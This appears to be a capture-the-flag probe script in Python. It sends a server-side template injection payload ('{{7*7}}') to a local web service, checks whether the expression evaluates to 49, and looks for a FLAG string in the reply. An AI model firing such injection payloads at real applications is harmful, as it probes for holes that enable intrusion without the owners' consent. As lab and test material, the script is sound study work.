import requests, re, sys

try:
    # Test basic connectivity and SSTI
    response = requests.post('http://127.0.0.1:8080', 
                            data='name={{7*7}}',
                            headers={'Content-Type': 'application/x-www-form-urlencoded'})
    
    print("TARGET CONNECTED")
    print(f"Status: {response.status_code}")
    print(f"Response length: {len(response.text)}B")
    
    # Check for SSTI working
    if "49" in response.text:
        print("SSTI CONFIRMED: {{7*7}} evaluated to 49")
    else:
        print("SSTI not working in response")
    
    # Check for flag directly
    flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
    if flag_match:
        print(f"FLAG FOUND: {flag_match.group(0)}")
    
    print(f"\nFull response:\n{response.text}")
    
except Exception as e:
    print(f"Connection failed: {str(e)}")
    sys.exit(1)
